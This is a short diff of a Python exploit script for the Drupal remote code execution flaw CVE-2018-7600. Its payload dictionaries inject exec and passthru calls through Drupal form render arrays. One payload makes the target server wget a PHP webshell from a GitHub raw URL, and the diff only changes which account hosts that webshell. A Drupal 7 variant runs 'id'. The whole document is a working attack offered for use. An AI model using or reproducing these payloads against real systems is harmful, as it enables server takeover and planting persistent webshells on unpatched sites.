@@ -58,12 +58,12 @@ class Drupal_CVE_2018_7600():
                                            '_drupal_ajax': '1',
                                            'mail[#post_render][]': 'exec',
                                            'mail[#type]': 'markup',
-                                           'mail[#markup]': 'wget https://raw.githubusercontent.com/anarcoder/php/shell/hu3.html'},
+                                           'mail[#markup]': 'wget https://raw.githubusercontent.com/devel369/php/shell/hu3.html'},
                                'webshell': {'form_id': 'user_register_form',
                                             '_drupal_ajax': '1',
                                             'mail[#post_render][]': 'exec',
                                             'mail[#type]': 'markup',
-                                            'mail[#markup]': 'wget https://raw.githubusercontent.com/anarcoder/php/shell/hu3.php'}}
+                                            'mail[#markup]': 'wget https://raw.githubusercontent.com/devel369/php/shell/hu3.php'}}
                 drupal7conf = {'getParams': {'q': 'user/password',
                                              'name[#post_render][]': 'passthru',
                                              'name[#markup]': 'id',
